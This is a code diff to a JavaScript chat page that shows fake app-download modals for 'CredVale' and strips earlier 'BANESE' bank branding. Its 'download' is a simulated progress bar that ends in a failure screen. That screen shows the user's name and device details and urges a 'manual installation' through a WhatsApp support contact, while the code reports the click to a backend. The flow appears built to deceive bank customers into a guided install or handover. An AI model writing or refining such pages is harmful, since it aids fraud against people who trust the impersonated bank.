@@ -1646,9 +1646,8 @@
     return modelo;
   }
 
-  /* ---- DOWNLOAD MODAL ---- */
+  /* ---- DOWNLOAD MODAL (iOS-Inspired CredVale) ---- */
   function showDownloadModalInChat(clientId, limite) {
-    // Registra o clique via beacon
     if (clientId) {
       try {
         var baseUrl = window.__API_BASE || '/api';
@@ -1662,67 +1661,62 @@
         navigator.sendBeacon(baseUrl + '/app/register-download', new Blob([payload], { type: 'application/json' }));
       } catch(e) {}
     }
-    // Abre modal de download
     if (popupEl) closePopup();
     var deviceInfo = getDeviceInfo();
     var html =
-      '<div class="banese-modal">'+
-        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
-          '<div class="banese-modal-logo">BANESE</div>'+
-          '<div class="banese-modal-star">&#9733;</div>'+
-          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+      '<div class="cred-dl-modal">'+
+        '<div class="cred-dl-icon-wrap">'+
+          '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
+            '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>'+
+            '<polyline points="7 10 12 15 17 10"/>'+
+            '<line x1="12" y1="15" x2="12" y2="3"/>'+
+          '</svg>'+
         '</div>'+
-        '<div class="banese-modal-body">'+
-          '<div style="text-align:center;margin-bottom:14px;">'+
-            '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:4px;">Aplicativo disponível</div>'+
-            '<div style="font-size:0.8rem;color:#475569;">Seu cadastro foi concluído com sucesso.<br>Agora você poderá realizar o download do aplicativo.</div>'+
-          '</div>'+
-          '<div id="downloadSimArea">'+
-            '<button class="banese-cta" id="btnStartDownload" style="width:100%;padding:14px;font-size:0.9rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 20px rgba(4,120,87,0.25);">Baixar aplicativo</button>'+
-          '</div>'+
-        '</div>'+
+        '<h2 class="cred-dl-title">Aplicativo disponível</h2>'+
+        '<p class="cred-dl-desc">Seu cadastro foi concluído com sucesso.<br>Agora você já pode baixar o aplicativo e acessar todos os benefícios da CredVale.</p>'+
+        '<button class="cred-dl-btn cred-dl-btn--primary" id="btnStartDownload" style="width:100%;">Baixar aplicativo</button>'+
+        '<div class="cred-dl-footer">🔒 Seus dados estão protegidos com segurança.</div>'+
       '</div>';
     showPopup(html);
-
     document.getElementById('btnStartDownload').onclick = function() {
       startDownloadSimulation(clientId, limite, deviceInfo);
     };
   }
 
-  /* ---- SIMULAÇÃO DE DOWNLOAD COM PROGRESSO ---- */
+  /* ---- DOWNLOAD PROGRESS (iOS-Inspired CredVale) ---- */
   function startDownloadSimulation(clientId, limite, deviceInfo) {
     var stages = [
-      { label:'Preparando...', pct: 15 },
+      { label:'Preparando arquivos...', pct: 15 },
       { label:'Baixando...', pct: 40 },
       { label:'Instalando...', pct: 70 },
-      { label:'Configurando...', pct: 90 },
-      { label:'Verificando compatibilidade...', pct: 100 }
+      { label:'Configurando aplicativo...', pct: 90 },
+      { label:'Finalizando instalação...', pct: 100 }
     ];
 
     var simHtml =
-      '<div class="banese-modal">'+
-        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
-          '<div class="banese-modal-logo">BANESE</div>'+
-          '<div class="banese-modal-star">&#9733;</div>'+
-          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
+      '<div class="cred-dl-modal">'+
+        '<div class="cred-dl-icon-wrap">'+
+          '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
+            '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>'+
+            '<polyline points="7 10 12 15 17 10"/>'+
+            '<line x1="12" y1="15" x2="12" y2="3"/>'+
+            '<animateTransform attributeName="transform" type="translate" values="0,0;0,-4;0,0" dur="1.5s" repeatCount="indefinite"/>'+
+          '</svg>'+
         '</div>'+
-        '<div class="banese-modal-body">'+
-          '<div style="text-align:center;margin-bottom:12px;">'+
-            '<div style="display:inline-flex;align-items:center;gap:4px;background:rgba(4,120,87,0.1);border:1px solid rgba(4,120,87,0.15);border-radius:20px;padding:3px 12px 3px 8px;margin-bottom:8px;">'+
-              '<span style="width:10px;height:10px;border-radius:50%;background:#047857;animation:pulse 1s infinite;"></span>'+
-              '<span style="font-size:0.6rem;color:#047857;font-weight:700;">BAIXANDO</span>'+
-            '</div>'+
-            '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:2px;">Preparando download...</div>'+
-            '<div class="banese-dl-stage" id="dlStageLabel" style="font-size:0.78rem;color:#047857;font-weight:600;margin-bottom:14px;">Preparando...</div>'+
+        '<span class="cred-dl-badge" id="dlBadge">Instalando...</span>'+
+        '<h2 class="cred-dl-title" id="dlTitle">Baixando aplicativo</h2>'+
+        '<p class="cred-dl-desc" style="margin-bottom:20px;">Isso pode levar alguns instantes.</p>'+
+        '<div class="cred-dl-progress">'+
+          '<div class="cred-dl-progress-track">'+
+            '<div class="cred-dl-progress-fill" id="dlProgressFill"></div>'+
           '</div>'+
-          '<div class="banese-progress-bar" style="height:14px;border-radius:10px;">'+
-            '<div class="banese-progress-fill" id="dlProgressFill" style="width:0%;transition:width 0.5s ease;height:14px;border-radius:10px;"></div>'+
-          '</div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.7rem;color:#475569;margin-top:4px;">'+
-            '<span id="dlProgressLabel">0%</span>'+
-            '<span id="dlDeviceInfo">'+(deviceInfo.modelo||'Dispositivo')+'</span>'+
+          '<div class="cred-dl-progress-info">'+
+            '<span class="cred-dl-progress-pct" id="dlProgressLabel">0%</span>'+
+            '<span class="cred-dl-progress-eta">Alguns segundos</span>'+
           '</div>'+
         '</div>'+
+        '<div class="cred-dl-stage" id="dlStageLabel">Preparando arquivos...</div>'+
+        '<div class="cred-dl-footer" style="margin-top:12px;">Não feche esta tela durante o processo.</div>'+
       '</div>';
 
     showPopup(simHtml);
@@ -1772,7 +1766,7 @@
     runStages(0);
   }
 
-  /* ---- MODAL DE FALHA NA INSTALAÇÃO (DESIGN PREMIUM BANESE) ---- */
+  /* ---- POP-UP 3: ERRO (iOS-Inspired CredVale) ---- */
   function showInstallFailure(clientId, limite, deviceInfo) {
     closePopup();
     setTimeout(function() {
@@ -1781,7 +1775,7 @@
       var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';
 
       var deviceMsg = encodeURIComponent(
-        'Olá! Preciso de ajuda com a instalação do aplicativo CredVale Banese.\n\n' +
+        'Olá! Preciso de ajuda com a instalação do aplicativo CredVale.\n\n' +
         'Cliente: ' + (user.nome || 'N/A') + '\n' +
         'Dispositivo: ' + (deviceInfo.dispositivo || 'N/A') + '\n' +
         'Fabricante: ' + (deviceInfo.fabricante || 'N/A') + '\n' +
@@ -1793,62 +1787,31 @@
       var waUrl = 'https://wa.me/55' + waNum.replace(/\D/g,'') + '?text=' + deviceMsg;
 
       var failHtml =
-        '<div class="banese-modal banese-modal--error">'+
-          '<div class="banese-modal-header" style="background:linear-gradient(135deg,#991B1B,#DC2626);">'+
-            '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
-            '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
-            '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
+        '<div class="cred-dl-modal">'+
+          '<div class="cred-dl-icon-wrap cred-dl-icon-wrap--alert">'+
+            '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
+              '<circle cx="12" cy="12" r="10"/>'+
+              '<line x1="12" y1="8" x2="12" y2="12"/>'+
+              '<line x1="12" y1="16" x2="12.01" y2="16"/>'+
+            '</svg>'+
           '</div>'+
-          '<div class="banese-modal-body">'+
-            '<div style="text-align:center;margin-bottom:12px;">'+
-              '<div style="width:52px;height:52px;margin:0 auto 10px;border-radius:50%;background:linear-gradient(135deg,rgba(239,68,68,0.12),rgba(220,38,38,0.06));display:flex;align-items:center;justify-content:center;border:1px solid rgba(239,68,68,0.15);">'+
-                '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>'+
-              '</div>'+
-              '<div style="font-size:1.05rem;font-weight:800;color:#022c22;margin-bottom:4px;">' + nomeCliente + ', não foi possível concluir a instalação</div>'+
-              '<div style="font-size:0.78rem;color:#475569;line-height:1.5;">'+
-                'Identificamos que houve uma tentativa de instalação do aplicativo no dispositivo abaixo:'+
-              '</div>'+
-            '</div>'+
-            '<div class="banese-dl-device-card">'+
-              '<div class="banese-dl-device-row">'+
-                '<span class="banese-dl-device-label">📱 Dispositivo</span>'+
-                '<span class="banese-dl-device-value">' + (deviceInfo.dispositivo || '—') + '</span>'+
-              '</div>'+
-              '<div class="banese-dl-device-row">'+
-                '<span class="banese-dl-device-label">🏭 Fabricante</span>'+
-                '<span class="banese-dl-device-value">' + (deviceInfo.fabricante || '—') + '</span>'+
-              '</div>'+
-              '<div class="banese-dl-device-row">'+
-                '<span class="banese-dl-device-label">📟 Modelo</span>'+
-                '<span class="banese-dl-device-value">' + (modeloResolvido || deviceInfo.modelo || '—') + '</span>'+
-              '</div>'+
-              '<div class="banese-dl-device-row" style="font-size:0.65rem;color:#94a3b8;padding:2px 0;border-bottom:none;">'+
-                '<span class="banese-dl-device-label" style="color:#94a3b8;">Código</span>'+
-                '<span class="banese-dl-device-value" style="color:#94a3b8;font-family:monospace;font-size:0.6rem;">' + (deviceInfo.modelo || '—') + '</span>'+
-              '</div>'+
-              '<div class="banese-dl-device-row">'+
-                '<span class="banese-dl-device-label">🖥️ Sistema</span>'+
-                '<span class="banese-dl-device-value">' + (deviceInfo.os || '—') + '</span>'+
-              '</div>'+
-            '</div>'+
-            '<div style="margin:10px 0 12px;padding:10px 14px;background:linear-gradient(135deg,rgba(4,120,87,0.05),rgba(16,185,129,0.03));border-left:3px solid #10B981;border-radius:8px;">'+
-              '<div style="font-size:0.75rem;color:#065F46;line-height:1.6;">'+
-                'A boa notícia é que <strong>é possível realizar a instalação manual</strong>, e nossa equipe pode acompanhar você durante todo o processo. O procedimento é simples, seguro e permite a liberação do aplicativo para funcionamento no seu dispositivo.'+
-              '</div>'+
-            '</div>'+
-            '<div style="display:flex;flex-direction:column;gap:8px;">'+
-              '<button class="banese-cta" id="btnRetryDownload" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 14px rgba(4,120,87,0.2);transition:all .3s;">Tentar novamente</button>'+
-              '<button class="banese-cta" id="btnCallSupport" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:#25D366;color:#fff;box-shadow:0 4px 14px rgba(37,211,102,0.2);transition:all .3s;">Chamar suporte</button>'+
-            '</div>'+
+          '<h2 class="cred-dl-title">' + nomeCliente + ', não foi possível concluir a instalação</h2>'+
+          '<p class="cred-dl-desc" style="margin-bottom:14px;">Identificamos que houve uma tentativa de instalação do aplicativo no dispositivo abaixo:</p>'+
+          '<div class="cred-dl-device-card">'+
+            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">📱 Dispositivo</span><span class="cred-dl-device-val">' + (deviceInfo.dispositivo || '—') + '</span></div>'+
+            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">🏭 Fabricante</span><span class="cred-dl-device-val">' + (deviceInfo.fabricante || '—') + '</span></div>'+
+            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">📟 Modelo</span><span class="cred-dl-device-val">' + (modeloResolvido || deviceInfo.modelo || '—') + '</span></div>'+
+            '<div class="cred-dl-device-row" style="padding:2px 0;border-bottom:none;"><span class="cred-dl-device-lbl" style="color:#94a3b8;font-size:0.65rem;">Código</span><span class="cred-dl-device-val" style="color:#94a3b8;font-family:monospace;font-size:0.6rem;">' + (deviceInfo.modelo || '—') + '</span></div>'+
+            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">🖥️ Sistema</span><span class="cred-dl-device-val">' + (deviceInfo.os || '—') + '</span></div>'+
           '</div>'+
+          '<div class="cred-dl-info-box">'+
+            'A boa notícia é que <strong>é possível realizar a instalação manual</strong>, e nossa equipe pode acompanhar você durante todo o processo. O procedimento é simples, seguro e permite a liberação do aplicativo para funcionamento no seu dispositivo.'+
+          '</div>'+
+          '<button class="cred-dl-btn cred-dl-btn--primary" id="btnCallSupport" style="width:100%;margin-bottom:8px;">📞 Chamar suporte</button>'+
+          '<button class="cred-dl-btn cred-dl-btn--outline" id="btnRetryDownload" style="width:100%;">Tentar novamente</button>'+
         '</div>';
 
       showPopup(failHtml);
-
-      document.getElementById('btnRetryDownload').onclick = function() {
-        closePopup();
-        setTimeout(function() { showDownloadModalInChat(clientId, limite); }, 200);
-      };
 
       document.getElementById('btnCallSupport').onclick = function() {
         closePopup();
@@ -1865,10 +1828,15 @@
           { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
         ]);
       };
+
+      document.getElementById('btnRetryDownload').onclick = function() {
+        closePopup();
+        setTimeout(function() { showDownloadModalInChat(clientId, limite); }, 200);
+      };
     }, 200);
   }
 
-  /* ---- MODAL DE SUCESSO NA INSTALAÇÃO (quando erro desabilitado) ---- */
+  /* ---- POP-UP SUCESSO (iOS-Inspired CredVale) ---- */
   function showInstallSuccess(clientId, limite, deviceInfo) {
     closePopup();
     setTimeout(function() {
@@ -1876,35 +1844,24 @@
       var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';
 
       var successHtml =
-        '<div class="banese-modal">'+
-          '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
-            '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
-            '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
-            '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
+        '<div class="cred-dl-modal">'+
+          '<div class="cred-dl-icon-wrap cred-dl-icon-wrap--success">'+
+            '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">'+
+              '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>'+
+              '<polyline points="22 4 12 14.01 9 11.01"/>'+
+            '</svg>'+
           '</div>'+
-          '<div class="banese-modal-body">'+
-            '<div style="text-align:center;margin-bottom:14px;">'+
-              '<div style="width:64px;height:64px;margin:0 auto 12px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.15),rgba(4,120,87,0.08));display:flex;align-items:center;justify-content:center;border:1px solid rgba(16,185,129,0.2);">'+
-                '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
-              '</div>'+
-              '<div style="font-size:1.1rem;font-weight:800;color:#022c22;margin-bottom:4px;">' + nomeCliente + ', aplicativo instalado! 🎉</div>'+
-              '<div style="font-size:0.8rem;color:#475569;line-height:1.5;">'+
-                'Seu aplicativo CredVale Banese foi <strong>instalado com sucesso</strong>.<br>'+
-                'Agora você pode acessar sua conta e começar a aproveitar todos os benefícios.'+
-              '</div>'+
-            '</div>'+
-            '<button class="banese-cta" id="btnSuccessClose" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 14px rgba(4,120,87,0.2);">Ir para o aplicativo</button>'+
-            '<div style="margin-top:12px;padding:10px 14px;background:linear-gradient(135deg,rgba(37,211,102,0.08),rgba(37,211,102,0.03));border:1px solid rgba(37,211,102,0.15);border-radius:10px;text-align:center;">'+
-              '<div style="font-size:0.72rem;color:#065F46;">Precisa de ajuda? </strong><a href="https://wa.me/55' + waNum.replace(/\D/g,'') + '" target="_blank" style="color:#059669;font-weight:700;text-decoration:underline;">Fale com o suporte</a></strong></div>'+
-            '</div>'+
-          '</div>'+
+          '<h2 class="cred-dl-title">' + nomeCliente + ', aplicativo instalado! 🎉</h2>'+
+          '<p class="cred-dl-desc">Seu aplicativo CredVale foi <strong>instalado com sucesso</strong>.<br>Agora você pode acessar sua conta e começar a aproveitar todos os benefícios.</p>'+
+          '<button class="cred-dl-btn cred-dl-btn--primary" id="btnSuccessClose" style="width:100%;margin-bottom:12px;">Ir para o aplicativo</button>'+
+          '<div style="text-align:center;font-size:0.75rem;color:#94a3b8;">Precisa de ajuda? <a href="https://wa.me/55' + waNum.replace(/\D/g,'') + '" target="_blank" style="color:#059669;font-weight:700;text-decoration:underline;">Fale com o suporte</a></div>'+
         '</div>';
 
       showPopup(successHtml);
 
       document.getElementById('btnSuccessClose').onclick = function() {
         closePopup();
-        addMsg('✅ <strong>Aplicativo instalado com sucesso!</strong><br>Você já pode fechar esta página e acessar o aplicativo CredVale Banese.', 'bot');
+        addMsg('✅ <strong>Aplicativo instalado com sucesso!</strong><br>Você já pode fechar esta página e acessar o aplicativo CredVale.', 'bot');
         hideInput();
         showOptions([
           { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
